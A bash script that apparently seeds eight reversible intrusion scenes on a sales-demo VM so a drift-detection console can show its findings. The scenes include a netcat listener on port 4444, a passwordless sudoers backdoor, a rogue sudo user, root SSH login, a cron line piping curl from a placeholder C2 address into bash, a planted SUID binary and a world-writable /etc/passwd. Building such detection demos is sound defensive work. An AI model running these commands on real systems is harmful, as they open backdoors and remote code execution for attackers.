#!/usr/bin/env bash
# scripts/lab/live-attack-sim.sh
#
# Live-attack simulation for the canonical sales-demo VM
# (blackglass-rustdesk-demo, 167.99.59.55). This is the box you screen-share
# into via RustDesk during customer demos. Walks an operator through 8
# progressively nastier drift scenes — each one shows up in the
# BLACKGLASS console after the next agent push so the customer can see
# drift detection, remediation suggestions, and the audit trail in real
# time.
#
# Why this script exists in the repo:
#   The previous "Live Attack Simulation" was an unversioned local copy
#   that referenced a port (2222) the box no longer uses. Operators
#   running it from their laptops were either failing to seed drift or
#   seeding it on the wrong host. This file is the canonical,
#   version-controlled replacement; it stays aligned with
#   COLLECTOR_HOST_1 in .do/app-git.production.yaml so docs, scripts,
#   and the App Platform spec all agree on what "the demo VM" means.
#
# Usage on the demo VM (as root, after capturing a clean baseline):
#   curl -fsSL https://raw.githubusercontent.com/thevenomv/blackglass-console/main/scripts/lab/live-attack-sim.sh \
#     -o /root/live-attack-sim.sh
#   chmod +x /root/live-attack-sim.sh
#   /root/live-attack-sim.sh                # interactive walkthrough
#   /root/live-attack-sim.sh --quick        # non-interactive (CI/sales rehearsal)
#   /root/live-attack-sim.sh --reset        # remove every scene's drift
#   /root/live-attack-sim.sh --scene N      # run a single scene only
#
# All scenes are reversible by `--reset`. Nothing is destructive; nothing
# escalates beyond the demo VM's own root context.

set -euo pipefail

# ── Constants — single source of truth ──────────────────────────────────────
# These MUST match COLLECTOR_HOST_1{,_NAME} in .do/app-git.production.yaml
# and LAB_AGENT_HOST_ID. If you ever rebuild the demo droplet, update
# all three places (the helper `scripts/configure-collector-on-app.ps1`
# does the App Platform side for you).
DEMO_HOST_NAME="blackglass-rustdesk-demo"
DEMO_HOST_IP="167.99.59.55"
CONSOLE_URL="https://blackglasssec.com/dashboard"
AGENT_TIMER_INTERVAL_SECONDS=300

# ── Mode parsing ────────────────────────────────────────────────────────────
MODE="interactive"
SINGLE_SCENE=""
for arg in "$@"; do
  case "$arg" in
    --quick)   MODE="quick";;
    --reset)   MODE="reset";;
    --scene=*) SINGLE_SCENE="${arg#--scene=}";;
    --scene)   SINGLE_SCENE="next";;
    -h|--help)
      sed -n '2,30p' "$0"
      exit 0
      ;;
  esac
done

if [[ "${EUID}" -ne 0 ]]; then
  echo "live-attack-sim: must run as root (try: sudo $0)" >&2
  exit 1
fi

# ── Pretty output helpers ───────────────────────────────────────────────────
if [[ -t 1 ]] && command -v tput >/dev/null 2>&1; then
  C_GREEN="$(tput setaf 2)"
  C_YELLOW="$(tput setaf 3)"
  C_RED="$(tput setaf 1)"
  C_CYAN="$(tput setaf 6)"
  C_DIM="$(tput dim)"
  C_BOLD="$(tput bold)"
  C_RST="$(tput sgr0)"
else
  C_GREEN="" C_YELLOW="" C_RED="" C_CYAN="" C_DIM="" C_BOLD="" C_RST=""
fi

banner() {
  cat <<'BANNER'

 ██████  ██       █████   ██████ ██   ██  ██████  ██       █████  ███████ ███████
 ██   ██ ██      ██   ██ ██      ██  ██  ██       ██      ██   ██ ██      ██
 ██████  ██      ███████ ██      █████   ██   ███ ██      ███████ ███████ ███████
 ██   ██ ██      ██   ██ ██      ██  ██  ██    ██ ██      ██   ██      ██      ██
 ██████  ███████ ██   ██  ██████ ██   ██  ██████  ███████ ██   ██ ███████ ███████

BANNER
  printf '%sLive Attack Simulation%s -- Demo Host: %s%s%s (%s)\n' \
    "$C_BOLD" "$C_RST" "$C_BOLD" "$DEMO_HOST_NAME" "$C_RST" "$DEMO_HOST_IP"
  printf '%sBLACKGLASS console:%s %s\n' "$C_GREEN" "$C_RST" "$CONSOLE_URL"
  echo
  printf '%sMake sure you have captured a clean baseline before starting.%s\n' \
    "$C_YELLOW" "$C_RST"
}

step() { printf '\n%s==>%s %s\n' "$C_CYAN" "$C_RST" "$*"; }
ok()   { printf '    %s%s%s\n' "$C_GREEN" "$*" "$C_RST"; }
warn() { printf '    %s%s%s\n' "$C_YELLOW" "$*" "$C_RST"; }
err()  { printf '    %s%s%s\n' "$C_RED" "$*" "$C_RST"; }

prompt_continue() {
  if [[ "$MODE" == "interactive" ]]; then
    printf '\n%sRefresh %s and verify the finding, then press ENTER for the next scene...%s ' \
      "$C_DIM" "$CONSOLE_URL" "$C_RST"
    read -r _
  else
    sleep 1
  fi
}

assert_lab_box() {
  local short
  short="$(hostname --short 2>/dev/null || hostname)"
  if [[ "$short" != "$DEMO_HOST_NAME" ]]; then
    warn "Expected hostname '$DEMO_HOST_NAME' but this box is '$short'."
    warn "Continuing anyway, but findings will surface under hostId='host-${DEMO_HOST_IP//./-}'."
  fi
}

# ── Scene implementations ──────────────────────────────────────────────────
# IDs and behaviour intentionally match scripts/sandbox-seed.sh so the
# remediator's existing playbooks recognise the patterns.

scene_1_listener() {
  step "Scene 1 -- backdoor port listener on TCP 4444"
  pkill -f 'ncat -lkp 4444' 2>/dev/null || true
  if ! command -v ncat >/dev/null 2>&1; then
    DEBIAN_FRONTEND=noninteractive apt-get -qq install -y ncat >/dev/null
  fi
  nohup ncat -lkp 4444 </dev/null >/dev/null 2>&1 &
  ok "TCP/4444 now listening (pid $!) -- watch for new_listener finding"
}

scene_2_sudoers_backdoor() {
  step "Scene 2 -- sudoers privilege escalation"
  echo 'sandbox-user ALL=(ALL) NOPASSWD: ALL' > /etc/sudoers.d/sandbox-backdoor
  chmod 440 /etc/sudoers.d/sandbox-backdoor
  ok "/etc/sudoers.d/sandbox-backdoor written -- watch for sudoers_drift finding"
}

scene_3_rogue_user() {
  step "Scene 3 -- rogue user account"
  useradd -m -s /bin/bash attacker-ssh 2>/dev/null || true
  ok "User 'attacker-ssh' created -- watch for new_user finding"
}

scene_4_sudo_membership() {
  step "Scene 4 -- attacker added to sudo group"
  usermod -aG sudo attacker-ssh 2>/dev/null || true
  ok "attacker-ssh in sudo -- watch for privilege_escalation finding"
}

scene_5_permit_root_login() {
  step "Scene 5 -- sshd PermitRootLogin yes"
  sed -i 's/^#\?PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config
  systemctl reload ssh 2>/dev/null || systemctl reload sshd 2>/dev/null || true
  ok "sshd_config rewritten + reloaded -- watch for ssh_hardening finding"
}

scene_6_cron_beacon() {
  step "Scene 6 -- cron beacon to fake C2"
  echo '*/5 * * * * root curl -s http://203.0.113.0/beacon | bash' > /etc/cron.d/sandbox-beacon
  chmod 644 /etc/cron.d/sandbox-beacon
  ok "/etc/cron.d/sandbox-beacon written -- watch for cron_persistence finding"
}

scene_7_suid_binary() {
  step "Scene 7 -- SUID binary planted under /usr/local/bin"
  cp /usr/bin/id /usr/local/bin/sandbox-id
  chmod u+s /usr/local/bin/sandbox-id
  ok "/usr/local/bin/sandbox-id is now SUID -- watch for suid_change finding"
}

scene_8_world_writable_passwd() {
  step "Scene 8 -- /etc/passwd set to world-writable"
  chmod 666 /etc/passwd
  ok "/etc/passwd is now 0666 -- watch for permission_drift finding"
}

# ── Reset ──────────────────────────────────────────────────────────────────
reset_all() {
  step "Reset -- removing every scene's drift"
  pkill -f 'ncat -lkp 4444' 2>/dev/null || true
  rm -f /etc/sudoers.d/sandbox-backdoor 2>/dev/null || true
  userdel -r attacker-ssh 2>/dev/null || true
  sed -i 's/^PermitRootLogin yes/PermitRootLogin no/' /etc/ssh/sshd_config 2>/dev/null || true
  systemctl reload ssh 2>/dev/null || systemctl reload sshd 2>/dev/null || true
  rm -f /etc/cron.d/sandbox-beacon 2>/dev/null || true
  find /usr/local/bin -name 'sandbox-*' -delete 2>/dev/null || true
  chmod 644 /etc/passwd 2>/dev/null || true
  ok "All drift cleared. Re-capture the baseline from the console for a clean slate."
}

# ── Main flow ──────────────────────────────────────────────────────────────
SCENES=(
  scene_1_listener
  scene_2_sudoers_backdoor
  scene_3_rogue_user
  scene_4_sudo_membership
  scene_5_permit_root_login
  scene_6_cron_beacon
  scene_7_suid_binary
  scene_8_world_writable_passwd
)

if [[ "$MODE" == "reset" ]]; then
  reset_all
  exit 0
fi

banner
assert_lab_box

if [[ -n "$SINGLE_SCENE" ]]; then
  if ! [[ "$SINGLE_SCENE" =~ ^[1-8]$ ]]; then
    err "--scene must be a number 1..8 (got '$SINGLE_SCENE')"
    exit 2
  fi
  "${SCENES[$((SINGLE_SCENE - 1))]}"
  exit 0
fi

if [[ "$MODE" == "interactive" ]]; then
  printf '\n%sPress ENTER to begin...%s ' "$C_BOLD" "$C_RST"
  read -r _
fi

START_TS=$(date -u +%s)
for fn in "${SCENES[@]}"; do
  "$fn"
  prompt_continue
done

ELAPSED=$(( $(date -u +%s) - START_TS ))
echo
ok "All 8 scenes complete in ${ELAPSED}s."
warn "Up to ${AGENT_TIMER_INTERVAL_SECONDS}s for the next blackglass-agent push to land — refresh the console."
echo
printf '%sWhen finished, reset the lab with:%s\n  sudo %s --reset\n\n' \
  "$C_DIM" "$C_RST" "$0"
